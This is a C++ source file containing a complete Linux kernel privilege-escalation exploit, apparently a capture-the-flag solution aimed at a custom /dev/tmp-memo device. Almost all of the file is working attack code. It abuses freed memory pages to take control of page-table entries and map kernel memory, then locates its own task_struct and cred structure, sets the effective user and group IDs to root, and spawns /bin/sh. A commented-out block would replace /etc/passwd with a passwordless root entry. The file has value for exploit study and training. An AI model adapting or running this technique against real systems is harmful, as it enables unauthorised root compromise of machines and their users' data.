#include <fcntl.h>
#include <inttypes.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <unistd.h>

#include <cstdint>
#include <cstring>
#include <vector>

#define CHECK(condition)                                              \
  do {                                                                \
    if (!(condition)) {                                               \
      CheckFailure("Check failed at %s:%d: %s\n", __FILE__, __LINE__, \
                   #condition);                                       \
    }                                                                 \
  } while (0);

#define PCHECK(condition)                                                  \
  do {                                                                     \
    if (!(condition)) {                                                    \
      CheckFailure("Check failed at %s:%d (%m): %s\n", __FILE__, __LINE__, \
                   #condition);                                            \
    }                                                                      \
  } while (0);

void CheckFailure(const char* format, ...) {
  // asm("int3");
  va_list ap;
  va_start(ap, format);
  vfprintf(stderr, format, ap);
  va_end(ap);
  abort();
}

template <class Tp>
inline void DoNotOptimize(Tp& value) {
  asm volatile("" : "+r,m"(value) : : "memory");
}

void Pause() {
  printf("Pause...");
  fflush(stdout);
  getchar();
}

int memo_fd;
uintptr_t vmemmap_base;
int target_page_nr = -1;
uintptr_t* pte;

uint8_t* Map(size_t size, off_t offset) {
  auto* ptr = reinterpret_cast<uint8_t*>(
      mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, memo_fd, offset));
  CHECK(ptr != MAP_FAILED);
  return ptr;
}

void Unmap(void* ptr, size_t size) { PCHECK(munmap(ptr, size) == 0); }

void FaultIn(void* addr) {
  auto v = *reinterpret_cast<uint8_t*>(addr);
  DoNotOptimize(v);
}

uint8_t* MapKernelPages(uintptr_t kaddr, int n) {
  for (int i = 0; i < n; ++i) {
    pte[i] = kaddr;
    kaddr += 4096;
  }
  return Map(4096 * n, target_page_nr * 4096);
}

#define MEMOPAGE_SIZE_MAX (1 << 30)
#define PAGE_TABLE_SPAN (1 << 21)

struct cred {
  int usage;
  uid_t uid;   /* real UID of the task */
  gid_t gid;   /* real GID of the task */
  uid_t suid;  /* saved UID of the task */
  gid_t sgid;  /* saved GID of the task */
  uid_t euid;  /* effective UID of the task */
  gid_t egid;  /* effective GID of the task */
  uid_t fsuid; /* UID for VFS ops */
  gid_t fsgid; /* GID for VFS ops */
};

int main(int argc, char** argv) {
  // constexpr char kScriptPath[] = "/home/ctf/xxx";
  // int script_fd = open(kScriptPath, O_WRONLY | O_CREAT, 0777);
  // PCHECK(script_fd != -1);
  // constexpr char kScript[] = "#!/bin/sh\ncp /etc/passwd
  // /etc/passwd.back\necho 'root::0:0:root:/root:/bin/sh' > /etc/passwd";
  // PCHECK(write(script_fd, kScript, sizeof(kScript) - 1) == sizeof(kScript) -
  // 1); PCHECK(close(script_fd) == 0);

  constexpr char kProcName[] = "KERNEL_EXPLOIT";
  PCHECK(prctl(PR_SET_NAME, kProcName) == 0);

  memo_fd = open("/dev/tmp-memo", O_RDWR);
  PCHECK(memo_fd != -1);

  uint8_t* map1 = Map(MEMOPAGE_SIZE_MAX, 0);
  PCHECK(map1 != MAP_FAILED);

  uint8_t* map2 = Map(MEMOPAGE_SIZE_MAX, 0);
  PCHECK(map2 != MAP_FAILED);

  std::vector<int> mapped_pages;
  constexpr int kNumPagesToFree = 64;
  for (int i = 0; i < kNumPagesToFree; ++i) {
    FaultIn(&map1[i * 4096]);
    mapped_pages.push_back(i);
  }

  Unmap(map1, MEMOPAGE_SIZE_MAX);

  constexpr int kNumPageTablesToAllocate = 256;
  for (int i = 0; i < kNumPageTablesToAllocate; ++i) {
    int offset = PAGE_TABLE_SPAN * (i + 1);
    FaultIn(&map2[offset]);
    mapped_pages.push_back(offset / 4096);
  }

  uintptr_t target_page;
  for (int i = 0; i < kNumPagesToFree; ++i) {
    auto* candidate = reinterpret_cast<uintptr_t*>(&map2[i * 4096]);
    if (candidate[0] != 0 && candidate[1] == 0) {
      printf("Found pte %p containing 0x%" PRIxPTR "\n", candidate,
             candidate[0]);
      pte = candidate;
      target_page = candidate[0];
      break;
    }
  }
  CHECK(pte != nullptr);

  vmemmap_base = *pte & 0xfffffffff0000000l;
  printf("vmemmap_base = %p\n", reinterpret_cast<void*>(vmemmap_base));

  for (int page : mapped_pages) {
    target_page_nr = page;
    auto* one = MapKernelPages(target_page, 1);
    FaultIn(one);
    auto* two = MapKernelPages(vmemmap_base, 1);
    const bool found = memcmp(one, two, 4096) != 0;
    if (found) {
      break;
    }
    target_page_nr = -1;
  }
  CHECK(target_page_nr >= 0);

  printf("Searching for task_struct...\n");
  uintptr_t page = vmemmap_base + 0x1000000;
  uintptr_t cred_ptr;
  while (true) {
    char* ptr = reinterpret_cast<char*>(MapKernelPages(page, 512));
    printf("finding in %p\n", (void*)page);

  again:
    auto* comm = reinterpret_cast<char*>(
        memmem(ptr, 4096 * 512, kProcName, sizeof(kProcName)));
    if (comm != nullptr) {
      printf("found comm in 0x%" PRIxPTR "\n", page + comm - ptr);
      cred_ptr = reinterpret_cast<uintptr_t*>(comm)[-1];
      if (cred_ptr & 0x8000000000000000l) {
        printf("likely task_struct\n");
        break;
      }
      ptr = comm + sizeof(kProcName);
      goto again;
    }
    page += 4096 * 512;
  }

  printf("cred = %" PRIxPTR "\n", cred_ptr);
  const size_t cred_page_offset = cred_ptr & 0xfff;
  auto* cred = reinterpret_cast<struct cred*>(MapKernelPages(cred_ptr, 1) +
                                              cred_page_offset);
  printf("currently: %d, %d (%p)\n", cred->euid, cred->egid, cred);

  cred->euid = 0;
  cred->egid = 0;
  PCHECK(setresuid(0, 0, 0) == 0);
  PCHECK(setresgid(0, 0, 0) == 0);
  system("/bin/sh");

  return 0;
}
